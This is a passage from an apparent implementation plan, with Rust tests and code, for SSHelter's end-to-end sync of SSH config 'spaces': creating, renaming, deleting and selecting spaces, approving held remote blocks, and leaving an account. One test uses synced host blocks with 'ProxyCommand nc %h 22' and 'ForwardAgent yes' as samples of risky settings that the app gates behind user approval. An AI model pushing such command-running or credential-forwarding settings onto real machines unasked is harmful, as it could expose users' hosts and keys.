    device_name, plan_device, put_account_record, put_space_key, selected_include_tokens, space_deleted_by, space_entries,
    space_entry, space_key_slot, space_keys,
};
use crate::sync::reconcile::HostEffect;
use crate::sync::record::{record_key, LocalRecord, RecordKind};
use crate::sync::runtime::{mutate, save_core};
use crate::sync::space_files::{self, slugify, space_file_name, RenameOutcome};
use crate::sync::state_v2::{AccountState, DeclinedVersion, SpaceState, SyncNotice, SyncStateV2};

#[cfg(test)]
mod tests {
    use super::*;
    use crate::sync::account::{create_account, FROZEN_MESSAGE, ROTATING_MESSAGE};
    use crate::sync::env::Clock;
    use crate::sync::fake_relay::FakeRelay;
    use crate::sync::merge::{devices, merge_space};
    use crate::sync::reconcile::encode;
    use crate::sync::record::{Envelope, Record};
    use crate::sync::relay::{PullResponse, RelayApi};
    use crate::sync::state_v2::{FreezeInfo, RotationProgress};
    use crate::sync::testkit::{TestClock, TestDevice};

    fn new_device(name: &str) -> (TestDevice, String) {
        let (relay, clock) = (FakeRelay::new(), TestClock::new());
        let d = TestDevice::new(name, &relay, &clock);
        create_account(&d.env(), name).unwrap();
        let personal = d.state().spaces.keys().next().unwrap().clone();
        (d, personal)
    }

    fn include_line(d: &TestDevice) -> String {
        d.main_config().lines().find(|l| l.starts_with("Include ~/.ssh/sshelter/")).unwrap_or_default().to_string()
    }

    fn device_spaces(d: &TestDevice) -> Vec<String> {
        let s = d.state();
        devices(s.account.as_ref().unwrap()).into_iter().find(|(id, _)| id == &s.device_id).unwrap().1.spaces
    }

    #[test]
    fn space_names_must_be_present_short_and_unique() {
        let (d, _) = new_device("a");
        assert_eq!(clean_space_name("  Work  ").unwrap(), "Work");
        assert!(clean_space_name("   ").is_err());
        assert!(clean_space_name("a\nb").is_err());
        assert!(clean_space_name(&"x".repeat(65)).is_err());
        assert_eq!(create_space(&d.env(), "personal").unwrap_err().to_string(), "a space named 'personal' already exists");
    }

    #[test]
    fn a_space_whose_chain_cannot_be_created_leaves_nothing_behind() {
        let (d, _) = new_device("a");
        let before = d.state();
        d.relay.fail_creates_with_429(1);
        assert!(create_space(&d.env(), "Work").is_err());
        assert_eq!(d.state().account, before.account, "no record was written");
        assert_eq!(d.state().spaces.len(), 1);
        assert!(create_space(&d.env(), "Work").is_ok(), "trying again works");
    }

    #[test]
    fn a_new_space_gets_its_chain_records_file_and_include_line() {
        let (d, personal) = new_device("a");
        let work = create_space(&d.env(), "Work").unwrap();
        assert!(d.relay.exists(&work));
        let s = d.state();
        let account = s.account.as_ref().unwrap();
        assert_eq!(space_entries(account).iter().map(|e| e.name.as_str()).collect::<Vec<_>>(), vec!["Personal", "Work"]);
        assert!(account.records[&format!("space:{work}")].dirty);
        let keys = d.runtime.core.lock().unwrap().account_keys.clone().unwrap();
        assert!(account.sealed[&space_key_slot(&keys, &work)].dirty);
        assert!(s.spaces[&work].baseline_established && s.spaces[&work].selected);
        assert!(d.space_path(&work).is_file());
        let (p, w) = (s.spaces[&personal].file_name.clone(), s.spaces[&work].file_name.clone());
        assert_eq!(include_line(&d), format!("Include ~/.ssh/sshelter/{p} ~/.ssh/sshelter/{w}"));
        let loaded: Vec<PathBuf> = d.doc.lock().unwrap().as_ref().unwrap().files.iter().map(|f| f.path.clone()).collect();
        assert!(loaded.contains(&d.space_path(&personal)) && loaded.contains(&d.space_path(&work)));
        let mut expected = vec![personal, work];
        expected.sort();
        assert_eq!(device_spaces(&d), expected);
    }

    #[test]
    fn renaming_moves_the_file_and_keeps_the_old_name_when_the_target_exists() {
        let (d, personal) = new_device("a");
        let old = d.space_path(&personal);
        d.save_in_app(&old, "Host web\n");
        rename_space(&d.env(), &personal, "Home Lab").unwrap();
        let s = d.state();
        assert_eq!(space_entry(s.account.as_ref().unwrap(), &personal).unwrap().slug, "home-lab");
        let new = d.space_path(&personal);
        assert_eq!(new.file_name().unwrap().to_string_lossy(), format!("home-lab-{}.config", &personal[..8]));
        assert!(!old.exists());
        assert_eq!(d.read(&new), "Host web\n");
        assert!(include_line(&d).contains("home-lab-"));
        // 新檔名已被一個不在清單上的檔案佔用:不覆蓋、保留舊檔名、提示。
        let blocker = d.ssh_dir().join("sshelter").join(format!("office-{}.config", &personal[..8]));
        std::fs::write(&blocker, "Host keep\n").unwrap();
        rename_space(&d.env(), &personal, "Office").unwrap();
        assert_eq!(d.space_path(&personal), new, "the old file name stays");
        assert_eq!(d.read(&blocker), "Host keep\n");
        assert!(matches!(&d.state().notices[..], [SyncNotice::RenameBlocked { name, .. }] if name == "Office"));
        assert_eq!(d.events.notices.lock().unwrap().len(), 1);
    }

    #[test]
    fn deleting_a_space_tombstones_it_removes_the_file_and_queues_the_chain_delete() {
        let (d, personal) = new_device("a");
        let work = create_space(&d.env(), "Work").unwrap();
        let file = d.space_path(&work);
        d.save_in_app(&file, "Host db\n");
        delete_space(&d.env(), &work).unwrap();
        assert!(!file.exists());
        assert!(!include_line(&d).contains(&work[..8]));
        let s = d.state();
        assert!(!s.spaces.contains_key(&work));
        let account = s.account.as_ref().unwrap();
        assert!(space_entry(account, &work).unwrap().deleted);
        let keys = d.runtime.core.lock().unwrap().account_keys.clone().unwrap();
        assert!(space_keys(account, &keys, &work).is_none(), "the spacekey record is a tombstone");
        assert_eq!(account.chain_deletes.len(), 1, "the chain is deleted after the tombstones are uploaded");
        assert!(d.relay.exists(&work));
        assert!(s.notices.is_empty(), "no 'deleted on another device' notice for our own delete");
        assert_eq!(device_spaces(&d), vec![personal]);
        // 備份留著。
        let backups = crate::fsutil::backup_dir_for(&file).unwrap();
        assert!(std::fs::read_dir(backups).unwrap().any(|e| e.unwrap().file_name().to_string_lossy().starts_with(&format!("work-{}", &work[..8]))));
    }

    #[test]
    fn selecting_starts_a_baseline_and_unselecting_removes_the_include_then_the_file() {
        let (d, personal) = new_device("a");
        let work = create_space(&d.env(), "Work").unwrap();
        let file = d.space_path(&work);
        unselect_space(&d.env(), &work).unwrap();
        assert!(!file.exists());
        assert!(!d.state().spaces.contains_key(&work));
        assert_eq!(device_spaces(&d), vec![personal.clone()]);
        // 留下的同名檔案(例如離開帳戶之後):勾選時保留內容,以基線輪開始。
        std::fs::write(&file, "Host left\n").unwrap();
        select_space(&d.env(), &work).unwrap();
        let s = d.state();
        assert!(!s.spaces[&work].baseline_established);
        assert_eq!(d.read(&file), "Host left\n");
        assert!(include_line(&d).contains(&work[..8]));
        assert!(select_space(&d.env(), &work).is_err(), "already selected");
    }

    fn hold(d: &TestDevice, space_id: &str, alias: &str, text: &str) {
        let keys = ChainKeys::generate().unwrap();
        let record = Record {
            kind: RecordKind::Host,
            id: alias.into(),
            version: 3,
            updated_at_ms: d.clock.now_ms(),
            device_id: "dev-b".into(),
            deleted: false,
            payload: serde_json::json!({ "schema": 1, "text": text }),
        };
        let item = encode(&keys, &record, 0).unwrap();
        let env = Envelope { id_hash: item.id_hash, kind: item.kind, seq: 7, nonce: item.nonce, ciphertext: item.ciphertext, deleted: false };
        let mut core = d.runtime.core.lock().unwrap();
        let sp = core.state.as_mut().unwrap().spaces.get_mut(space_id).unwrap();
        let merged = merge_space(sp, &keys, &PullResponse { records: vec![env], latest_seq: 7 }, &[], |_| "MacBook-B".to_string());
        assert_eq!(merged.held, vec![alias.to_string()]);
        let cursor = sp.cursor_seq;
        *sp = merged.section;
        sp.cursor_seq = cursor;
    }

    #[test]
    fn approving_applies_the_held_block_and_rejecting_keeps_the_local_one() {
        let (d, personal) = new_device("a");
        let file = d.space_path(&personal);
        d.save_in_app(&file, "Host db\n  User me\n");
        let proxy = "Host web\n  ProxyCommand nc %h 22\n";
        hold(&d, &personal, "web", proxy);
        hold(&d, &personal, "db", "Host db\n  ForwardAgent yes\n");
        assert!(approve(&d.env(), &personal, &["ghost".to_string()]).is_err());
        assert_eq!(approve(&d.env(), &personal, &["web".to_string()]).unwrap(), 1);
        assert_eq!(d.read(&file), format!("Host db\n  User me\n{proxy}"));
        let s = d.state();
        let sp = &s.spaces[&personal];
        assert!(!sp.pending_approvals.contains_key("web"));
        assert_eq!(sp.records["host:web"].seq, 7);
        assert!(!sp.records["host:web"].dirty, "an approved remote record is not a local edit");
        reject(&d.env(), &personal, &["db".to_string()]).unwrap();
        let sp = d.state().spaces[&personal].clone();
        assert!(sp.pending_approvals.is_empty());
        assert_eq!(sp.declined["db"].seq, 7);
        assert_eq!(d.read(&file), format!("Host db\n  User me\n{proxy}"), "rejecting changes nothing locally");
    }

    #[test]
    fn structural_changes_wait_for_a_new_sync_code_or_a_finished_rotation() {
        let (d, personal) = new_device("a");
        d.runtime.core.lock().unwrap().state.as_mut().unwrap().account.as_mut().unwrap().frozen =
            Some(FreezeInfo { detected_at_ms: 1, markers: Vec::new() });
        assert_eq!(create_space(&d.env(), "Work").unwrap_err().to_string(), FROZEN_MESSAGE);
        assert_eq!(rename_space(&d.env(), &personal, "X").unwrap_err().to_string(), FROZEN_MESSAGE);
        let mut core = d.runtime.core.lock().unwrap();
        let s = core.state.as_mut().unwrap();
        s.account.as_mut().unwrap().frozen = None;
        s.rotation = Some(RotationProgress::new(&"c".repeat(64), 1));
        drop(core);
        assert_eq!(delete_space(&d.env(), &personal).unwrap_err().to_string(), ROTATING_MESSAGE);
    }

    #[test]
    fn a_space_missing_on_the_relay_is_rebuilt_from_this_device() {
        let (d, personal) = new_device("a");
        d.save_in_app(&d.space_path(&personal), "Host web\n");
        assert!(rebuild_space(&d.env(), &personal).is_err(), "only a missing space can be rebuilt");
        let keys = {
            let core = d.runtime.core.lock().unwrap();
            space_keys(core.state.as_ref().unwrap().account.as_ref().unwrap(), core.account_keys.as_ref().unwrap(), &personal).unwrap()
        };
        d.relay.delete_chain(&keys.chain_id, &keys.auth_token).unwrap();
        {
            let mut core = d.runtime.core.lock().unwrap();
            let sp = core.state.as_mut().unwrap().spaces.get_mut(&personal).unwrap();
            sp.missing = true;
            sp.cursor_seq = 12;
            sp.records.get_mut("host:web").unwrap().dirty = false;
        }
        rebuild_space(&d.env(), &personal).unwrap();
        assert!(d.relay.exists(&personal));
        let sp = d.state().spaces[&personal].clone();
        assert!(!sp.missing && sp.cursor_seq == 0);
        assert!(sp.records.values().all(|l| l.dirty && l.seq == 0));
    }
}
```

- [ ] **Step 5: 更新 `src-tauri/src/sync/mod.rs`**

把 `src-tauri/src/sync/mod.rs` 整個換成:

```rust
//! Sync chain: Brave 式免帳號端對端同步。各子模組單一責任、皆可單元測試:
//! - `crypto`: 助記詞、金鑰派生、記錄加密
//! - `record`: 記錄模型與 LWW 合併(Task 2)
//! - `hosts_file`: 受管同步檔的區塊操作(Task 3)
//! - `planner`: 本機變更偵測(Task 1)
//! - `state`: 本機同步狀態持久化(Task 4)
//! - `relay`: 中繼 HTTP client(Task 5)
//! - `reconcile`: 一輪同步的三段純函式(plan_local → pull_merge → push_dirty)
//! - `engine`: 背景同步執行緒、`SyncCore`、存檔當下規劃、套用+發布交易、Tauri commands
//! - `space_files`: Sync v2 的 space 檔命名、Include 清單順序與建立 / 移除 / 改名的順序規則
//! - `approval`: Sync v2 危險設定的核准簽章
//! - `state_v2`: Sync v2 的本機狀態(`version: 2`)與 v1 狀態檔的偵測
//! - `merge`: Sync v2 帳戶與 space 區段的本機 diff、合併、上傳(純函式)
//! - `fake_relay`(只在測試):記憶體假 relay
//! - `dto`: Sync v2 給前端的事件與狀態形狀
//! - `runtime`: Sync v2 的 `SyncCore` 與局部提交
//! - `env`: Sync v2 引擎與外界的邊界(keychain、relay、事件、時鐘)
//! - `files`: Sync v2 space 檔的準備、讀取、套用 + 發布交易、存檔 hook
//! - `testkit`(只在測試):測試裝置
//! - `account`: Sync v2 帳戶生命週期與 relay 設定
//! - `spaces`: Sync v2 space 操作與核准

pub mod account;
pub mod approval;
pub mod crypto;
pub mod dto;
pub mod engine;
pub mod env;
#[cfg(test)]
pub mod fake_relay;
pub mod files;
pub mod hosts_file;
pub mod merge;
pub mod migrate;
pub mod planner;
pub mod reconcile;
pub mod record;
pub mod relay;
pub mod runtime;
pub mod space_files;
pub mod spaces;
pub mod state;
pub mod state_v2;
#[cfg(test)]
pub mod testkit;
```

- [ ] **Step 6: 跑測試確認失敗**

Run: `cd src-tauri && cargo test -- --skip secrets::tests::round_trip_set_get_delete --skip askpass::tests::env_secret_takes_priority_over_keychain`
Expected: FAIL —— 編譯錯誤(測試用到的實作還不存在),例如:

```text
error[E0432]: unresolved imports `crate::sync::account::account_ready`, `crate::sync::account::add_selected_file`, `crate::sync::account::put_new_space`, `crate::sync::account::selected_ids`, `crate::sync::account::space_payload`, `crate::sync::account::NOT_JOINED_MESSAGE`
--> src/sync/spaces.rs:12:28
```

- [ ] **Step 7: 修改 `src-tauri/src/sync/space_files.rs`**

順序同 `rename_space_file`:先建新路徑(hard link;不支援就 `create_new` 複製成 0600)→ `write_include` → 刪舊路徑;失敗就移除已建的新路徑。

`src-tauri/src/sync/space_files.rs`:把

```rust
    out.sort();
    Ok(out)
}

```

換成:

```rust
    out.sort();
    Ok(out)
}

/// 離開帳戶之後,這台的檔案改當一般的本機檔案時放的目錄(spec §7.3):`~/.ssh/sshelter-local/`。它不在 `INCLUDE_DIR`
/// 底下,所以主 config 裡指向它的 Include 不是「我們的」token(`hosts_file::is_our_include_token`)——
/// `ensure_include` 永遠不碰,之後建立或加入別的帳戶,ssh 照樣讀得到這些檔案。
pub const LOCAL_INCLUDE_DIR: &str = "~/.ssh/sshelter-local/";

/// `<ssh_dir>/sshelter-local`(0700)。
pub fn local_dir(ssh_dir: &Path) -> PathBuf {
    ssh_dir.join("sshelter-local")
}

/// 一個改成本機檔案的檔案:主 config 裡原本的 Include token、新的完整路徑、新的 Include token。
#[derive(Clone, Debug, PartialEq)]
pub struct KeptFile {
    pub old_token: String,
    pub path: PathBuf,
    pub token: String,
}

/// 離開帳戶(spec §7.3「本機 space 檔案與 Include 保留,ssh 照常可用;它們之後就是一般的本機檔案」):把 `files`
/// (`~/.ssh/sshelter/` 裡的檔案:space 檔,或放棄升級時 v1 的 `hosts.config`)搬到 `~/.ssh/sshelter-local/`,檔名不變;
/// 那裡已有同名檔就用 `<名稱>-2.config`、`-3`……,絕不覆蓋。順序同改名(`rename_space_file`),主 config 從不指向不存在的
/// 檔案:先讓每個檔案以新路徑存在(hard link;不支援就複製成 0600 的新檔)→ `write_include`(呼叫端把主 config 裡的舊
/// token 原地換成新 token)→ 移除舊路徑。建立新路徑或 `write_include` 失敗 → 移除已建立的新路徑、回錯誤,什麼都沒變。
/// 舊路徑移除失敗只留下一份相同、不在 Include 上的檔案(OpenSSH 不讀),仍算成功。不存在的檔案略過;`write_include`
/// 一律呼叫(清單可能是空的 —— 呼叫端藉此拿掉指向已不存在檔案的 token)。
pub fn keep_files_local(
    ssh_dir: &Path,
    files: &[PathBuf],
    write_include: impl FnOnce(&[KeptFile]) -> Result<(), AppError>,
) -> Result<Vec<KeptFile>, AppError> {
    let mut sources = Vec::new();
    for path in files {
        if path.try_exists()? {
            sources.push(path);
        }
    }
    let mut kept = Vec::new();
    if let Err(e) = create_kept_files(ssh_dir, &sources, &mut kept).and_then(|()| write_include(&kept)) {
        for k in &kept {
            let _ = std::fs::remove_file(&k.path);
        }
        return Err(e);
    }
    for source in sources {
        if let Err(e) = std::fs::remove_file(source) {
            eprintln!("[sync] a file was kept as a local file but its old path could not be removed: {e}");
        }
    }
    Ok(kept)
}

/// `keep_files_local` 的第一步:每個檔案在 `~/.ssh/sshelter-local/`(0700)以新路徑存在。建立了的都記在 `kept`,失敗時
/// 呼叫端據此回復。
fn create_kept_files(ssh_dir: &Path, sources: &[&PathBuf], kept: &mut Vec<KeptFile>) -> Result<(), AppError> {
    if sources.is_empty() {
        return Ok(());
    }
    let dir = local_dir(ssh_dir);
    fsutil::ensure_dir_secure(&dir)?;
    for source in sources {
        let name = source
            .file_name()
            .and_then(|n| n.to_str())
            .ok_or_else(|| AppError::Other(format!("'{}' has no usable file name", source.display())))?;
        let (new_name, path) = create_kept_file(source, &dir, name)?;
        kept.push(KeptFile { old_token: format!("{INCLUDE_DIR}{name}"), path, token: format!("{LOCAL_INCLUDE_DIR}{new_name}") });
    }
    Ok(())
}

/// 在 `dir` 裡以 `file_name` 建立 `source` 的新路徑(已有同名檔就 `<名稱>-2.config`、`-3`……),絕不覆蓋任何檔案:先試
/// hard link(兩個路徑指向同一個檔案,權限照舊);檔案系統不支援時改成複製成 0600 的新檔。
fn create_kept_file(source: &Path, dir: &Path, file_name: &str) -> Result<(String, PathBuf), AppError> {
    let stem = file_name.strip_suffix(".config").unwrap_or(file_name);
    let mut links = true;
    let mut n = 1u32;
    loop {
        let name = if n == 1 { file_name.to_string() } else { format!("{stem}-{n}.config") };
        let target = dir.join(&name);
        let made = if links { std::fs::hard_link(source, &target) } else { copy_new(source, &target) };
        match made {
            Ok(()) => return Ok((name, target)),
            Err(e) if e.kind() == ErrorKind::AlreadyExists => n += 1,
            // 不支援 hard link 的檔案系統(FAT、部分網路磁碟):同一個名稱改用複製再試。
            Err(_) if links => links = false,
            Err(e) => return Err(AppError::Io(e)),
        }
    }
}

/// 複製成一個新檔:0600、`create_new`(目標已存在 → `AlreadyExists`,絕不覆蓋);寫到一半失敗就把它刪掉。
fn copy_new(source: &Path, target: &Path) -> std::io::Result<()> {
    let bytes = std::fs::read(source)?;
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    let mut file = options.open(target)?;
    let written = std::io::Write::write_all(&mut file, &bytes).and_then(|()| file.sync_all());
    if written.is_err() {
        let _ = std::fs::remove_file(target);
    }
    written
}

```

- [ ] **Step 8: 修改 `src-tauri/src/sync/hosts_file.rs`**

與 `ensure_include` 相同的掃描方式,只是把我們的 token 原地換掉而不是搬到最頂端;改寫的那一行同樣設 `enabled = true`(生效中的一行不能變成註解)。

`src-tauri/src/sync/hosts_file.rs`:把

```rust
    }
    true
}

```

換成:

```rust
    }
    true
}

/// 離開帳戶(spec §7.3):每一行 top-level Include 裡「我們的」token 照 `kept`(舊 token → 新 token)原地換成
/// `~/.ssh/sshelter-local/` 的路徑 —— 不再是我們的 token,之後 `ensure_include` 不碰它們;位置與其他 token 都不動,ssh
/// 讀這些檔案的先後不變。對照不到的我們的 token(檔案已經不在)拿掉,整行只剩它們就移除。回傳是否改了 items。
pub fn release_include(items: &mut Vec<Item>, kept: &[(String, String)]) -> bool {
    let mut changed = false;
    for i in (0..items.len()).rev() {
        let tokens: Vec<String> = match enabled_include(&items[i]) {
            Some(d) if d.value.split_whitespace().any(is_our_include_token) => d
                .value
                .split_whitespace()
                .filter_map(|t| {
                    if is_our_include_token(t) {
                        kept.iter().find(|(old, _)| old == t).map(|(_, new)| new.clone())
                    } else {
                        Some(t.to_string())
                    }
                })
                .collect(),
            _ => continue,
        };
        changed = true;
        if tokens.is_empty() {
            items.remove(i);
        } else if let Item::Directive(d) = &mut items[i] {
            d.value = tokens.join(" ");
            d.dirty = true;
            d.enabled = true; // 同 `ensure_include`:它是生效中的一行,標成 dirty 之後仍要寫成生效的一行,不能變成註解
        }
    }
    changed
}

```

- [ ] **Step 9: 實作 `src-tauri/src/sync/account.rs`**

重點:建立帳戶時 Personal 是隨機的 space(不是 space0);加入時從 seq 0 拉帳戶驗證存在(`404` → `NO_ACCOUNT_MESSAGE`;v1 的同步碼另外說明),帶著 `rotation:*` 標記就拒絕;離開時先(視需要刪掉 relay 上的 chain、)把檔案改成本機檔案,同一段 doc 鎖內作廢在途輪次、清掉帳戶狀態並持久化,再刪 keychain(刪不掉就記 `phrase_cleanup_pending`)。

`src-tauri/src/sync/account.rs`:在 `use` 區之後、`#[cfg(test)]` 之前加入:

```rust
/// 預設 space 的名稱(spec §7.3)。
pub const DEFAULT_SPACE_NAME: &str = "Personal";
pub const NO_ACCOUNT_MESSAGE: &str = "no sync account matches this sync code (check the words and the relay URL)";
pub const OLD_FORMAT_MESSAGE: &str =
    "this sync code still uses the previous sync format: update SSHelter on a device that already syncs with it, let it upgrade, then join again";
pub const NOT_JOINED_MESSAGE: &str = "join or create a sync account first";
pub const NO_KEYS_MESSAGE: &str = "the sync code is not available on this device; unlock the keychain and restart SSHelter";
pub const FROZEN_MESSAGE: &str = "the sync code was changed on another device; enter the new sync code first";
pub const ROTATING_MESSAGE: &str = "finish or cancel changing the sync code first";
pub const READ_ONLY_MESSAGE: &str = "this sync account uses a newer format; update SSHelter to keep syncing";
const NO_CONFIG_MESSAGE: &str =
    "SSHelter could not load your SSH config — create it (an empty ~/.ssh/config is fine) and reload, then try again";
const NO_RELAY_MESSAGE: &str = "enter a relay URL first (Settings → Sync → Relay URL) — this build has no built-in relay";
const OTHER_ACCOUNT_MESSAGE: &str = "the sync code in the keychain belongs to a different sync account; leave and join again";

/// 裝置名稱:去掉前後空白,不得為空。
pub fn clean_device_name(name: &str) -> Result<String, AppError> {
    let name = name.trim();
    if name.is_empty() {
        return Err(AppError::Other("device name cannot be empty".to_string()));
    }
    Ok(name.to_string())
}

/// 啟動時狀態檔讀不到(`save_blocked`)就拒絕會寫狀態或 keychain 的動作(同 v1);v1 升級還沒完成時也拒絕
/// (keychain 裡的同步碼還要拿來升級)。
pub fn saves_allowed(env: &SyncEnv) -> Result<(), AppError> {
    let core = env.runtime.core.lock().unwrap();
    if let Some(reason) = core.save_blocked.clone() {
        return Err(AppError::Other(reason));
    }
    if core.legacy.is_some() {
        return Err(AppError::Other(crate::sync::runtime::UPGRADING_MESSAGE.to_string()));
    }
    Ok(())
}

fn relay_configured(url: &str) -> Result<(), AppError> {
    if url.trim().is_empty() {
        Err(AppError::Other(NO_RELAY_MESSAGE.to_string()))
    } else {
        Ok(())
    }
}

/// 建立 / 加入之前 doc 必須已載入:沒有 `~/.ssh/config` 時引擎每輪都安靜跳過,加入看起來成功卻永遠不會同步。
fn config_loaded(env: &SyncEnv) -> Result<(), AppError> {
    if env.doc.lock().unwrap().is_some() {
        Ok(())
    } else {
        Err(AppError::Other(NO_CONFIG_MESSAGE.to_string()))
    }
}

/// 會改動帳戶結構的動作(space 的建立 / 改名 / 刪除 / 勾選、核准)之前的共同檢查:已加入、有帳戶金鑰、沒有被更換
/// 同步碼(spec §7.5)、沒有正在更換、帳戶格式看得懂。
pub fn account_ready(s: &SyncStateV2, keys: Option<&ChainKeys>) -> Result<(), AppError> {
    if !s.joined() {
        return Err(AppError::Other(NOT_JOINED_MESSAGE.to_string()));
    }
    if keys.is_none() {
        return Err(AppError::Other(NO_KEYS_MESSAGE.to_string()));
    }
    if s.frozen().is_some() {
        return Err(AppError::Other(FROZEN_MESSAGE.to_string()));
    }
    if s.rotation.is_some() {
        return Err(AppError::Other(ROTATING_MESSAGE.to_string()));
    }
    if s.read_only() {
        return Err(AppError::Other(READ_ONLY_MESSAGE.to_string()));
    }
    Ok(())
}

/// 啟動時從 keychain 讀同步碼 → 帳戶金鑰(同 v1 `keys_from_keychain` 的分類)。失敗時回傳要放進 `last_error` 的
/// 說明;推導失敗一律用固定訊息(錯誤文字可能帶到同步碼裡的字)。推導出的 chain id 必須是狀態裡的帳戶 chain。
pub fn account_keys_from_keychain(read: Result<Option<String>, AppError>, chain_id: &str) -> Result<ChainKeys, String> {
    match read {
        Ok(Some(words)) => {
            let keys = crypto::derive_account(&words)
                .map_err(|_| "the stored sync code could not be used; leave and join again".to_string())?;
            if keys.chain_id != chain_id {
                return Err(OTHER_ACCOUNT_MESSAGE.to_string());
            }
            Ok(keys)
        }
        Ok(None) => Err("the sync code is missing from the keychain; leave and join again".to_string()),
        Err(e) => Err(format!("could not read the sync code from the keychain ({e}); unlock the keychain and restart SSHelter")),
    }
}

/// 這台勾選的 space id(排序),寫進裝置記錄。
pub fn selected_ids(s: &SyncStateV2) -> Vec<String> {
    s.spaces.iter().filter(|(_, sp)| sp.selected).map(|(id, _)| id.clone()).collect()
}

/// 在帳戶區段寫一個新 space 的 `space` 與 `spacekey` 記錄(spec §7.2)。
pub fn put_new_space(
    account: &mut AccountState,
    account_keys: &ChainKeys,
    space: &ChainKeys,
    payload: &SpacePayload,
    device_id: &str,
    now_ms: u64,
) -> Result<(), AppError> {
    put_account_record(
        account,
        RecordKind::Space,
        &space.chain_id,
        serde_json::to_value(payload).expect("SpacePayload serializes"),
        false,
        device_id,
        now_ms,
    );
    put_space_key(account, account_keys, &space.chain_id, Some(space), device_id, now_ms)
}

/// 新 space 的 payload:slug 由名稱產生。
pub fn space_payload(name: &str, created_at_ms: u64, previous_id: Option<String>) -> SpacePayload {
    SpacePayload { schema: SCHEMA_VERSION, name: name.to_string(), slug: slugify(name), created_at_ms, previous_id }
}

/// 加入帳戶前,把狀態的帳戶部分換成 `account`(生命週期變更:換 generation、計數歸零)。呼叫端持有 doc 鎖。
fn install_account(env: &SyncEnv, account: AccountState, keys: ChainKeys, device_name: String, spaces: Vec<(String, SpaceState)>) -> Result<(), AppError> {
    let now = env.now();
    let mut core = env.runtime.core.lock().unwrap();
    core.generation += 1;
    core.conflict_streak = 0;
    core.failed_rounds = 0;
    core.batch_failures = 0;
    let s = core.state.as_mut().ok_or_else(|| AppError::Other("sync is not initialized".to_string()))?;
    s.device_name = device_name;
    s.account = Some(account);
    s.spaces = spaces.into_iter().collect();
    s.rotation = None;
    s.phrase_cleanup_pending = false;
    s.last_sync_ms = None;
    s.last_error = None;
    let ids = selected_ids(s);
    let (device_id, name) = (s.device_id.clone(), s.device_name.clone());
    plan_device(s.account.as_mut().expect("just set"), &device_id, &name, env.platform, &ids, now);
    core.account_keys = Some(keys);
    save_core(&mut core, &env.state_path)
}

/// 建立帳戶(spec §7.3,第一台、非 v1 升級):產生同步碼 → 推導帳戶 chain 並 `PUT` → 預設 space「Personal」(隨機,
/// 不是 space0)也 `PUT` → 存同步碼進 keychain → 寫入帳戶 `meta`、`device`、`space`、`spacekey` 並勾選 Personal(先建
/// 檔、再加進 Include)。回傳同步碼,交給使用者保存。帳戶狀態與同步碼存下之後就不再失敗:準備檔案失敗只記到
/// stderr,下一輪會再做一次。
pub fn create_account(env: &SyncEnv, device_name: &str) -> Result<String, AppError> {
    let device_name = clean_device_name(device_name)?;
    saves_allowed(env)?;
    config_loaded(env)?;
    let s = snapshot(env).ok_or_else(|| AppError::Other("sync is not initialized".to_string()))?;
    if s.joined() {
        return Err(AppError::Other("already in a sync account; leave it first".to_string()));
    }
    relay_configured(&s.relay_url)?;
    let words = crypto::generate_mnemonic()?;
    let account_keys = crypto::derive_account(&words)?;
    let personal = ChainKeys::generate()?;
    let relay = env.relay(&s.relay_url)?;
    relay.create_chain(&account_keys.chain_id, &account_keys.auth_token)?;
    relay.create_chain(&personal.chain_id, &personal.auth_token)?;
    env.keychain.set(MNEMONIC_ACCOUNT, &words)?;
    let now = env.now();
    let mut account = AccountState::new(&account_keys.chain_id);
    account.baseline_established = true;
    put_account_record(
        &mut account,
        RecordKind::Meta,
        ACCOUNT_META_ID,
        serde_json::to_value(MetaPayload::account(env!("CARGO_PKG_VERSION"))).expect("MetaPayload serializes"),
        false,
        &s.device_id,
        now,
    );
    let payload = space_payload(DEFAULT_SPACE_NAME, now, None);
    put_new_space(&mut account, &account_keys, &personal, &payload, &s.device_id, now)?;
    let file_name = space_file_name(&payload.slug, &personal.chain_id)?;
    let mut space = SpaceState::new(&file_name);
    space.baseline_established = true; // 新的空 chain:沒有基線可言
    {
        let mut doc_lock = env.doc.lock().unwrap();
        install_account(env, account, account_keys, device_name, vec![(personal.chain_id.clone(), space)])?;
        if let Err(e) = add_selected_file(env, &mut doc_lock, &file_name) {
            eprintln!("[sync] could not prepare the new space file ({e}); the next sync round retries");
        }
    }
    env.events.applied(0);
    env.events.wake();
    Ok(words)
}

/// 勾選的 space 檔:先建好檔案、再更新 Include 清單(spec §4.3),然後重載 doc。呼叫端持有 doc 鎖、不持有 core 鎖。
pub fn add_selected_file(env: &SyncEnv, doc_lock: &mut Option<SshConfigDoc>, file_name: &str) -> Result<(), AppError> {
    let Some(doc) = doc_lock.as_mut() else { return Ok(()) };
    let tokens = {
        let core = env.runtime.core.lock().unwrap();
        let s = core.state.as_ref().ok_or_else(|| AppError::Other("sync is not initialized".to_string()))?;
        crate::sync::merge::selected_include_tokens(s.account.as_ref(), &s.spaces)?
    };
    let mut backed_up = env.backed_up.lock().unwrap();
    let retention = env.retention();
    space_files::add_space_file(&env.ssh_dir, file_name, None, || write_include(doc, &mut backed_up, retention, &tokens))?;
    drop(backed_up);
    let main = doc.files[0].path.clone();
    *doc_lock = Some(env.load_doc(&main)?);
    Ok(())
}

/// 加入帳戶(spec §7.3,新電腦):推導帳戶 chain → 從 seq 0 拉取驗證存在(`404` → 找不到帳戶,絕不建立;若是 v1
/// 的同步碼另外說明)→ 帶著 `rotation:*` 標記就拒絕(這組同步碼已被更換)→ 存同步碼進 keychain → 寫入帳戶狀態與
/// `device` 記錄。還沒有勾選任何 space:使用者接著勾選(`spaces::select_space`),每個勾選的 space 以基線輪開始。
pub fn join_account(env: &SyncEnv, words: &str, device_name: &str) -> Result<(), AppError> {
    let words = crypto::normalize_mnemonic(words)?;
    let device_name = clean_device_name(device_name)?;
    saves_allowed(env)?;
    config_loaded(env)?;
    let s = snapshot(env).ok_or_else(|| AppError::Other("sync is not initialized".to_string()))?;
    if s.joined() {
        return Err(AppError::Other("already in a sync account; leave it first".to_string()));
    }
    relay_configured(&s.relay_url)?;
    let account_keys = crypto::derive_account(&words)?;
    let relay = env.relay(&s.relay_url)?;
    let pulled = match relay.pull(&account_keys.chain_id, &account_keys.auth_token, 0) {
        Ok(p) => p,
        Err(RelayError::NotFound) => {
            // v1 的 chain 還在:這組同步碼的電腦都還沒升級(spec §7.6)。
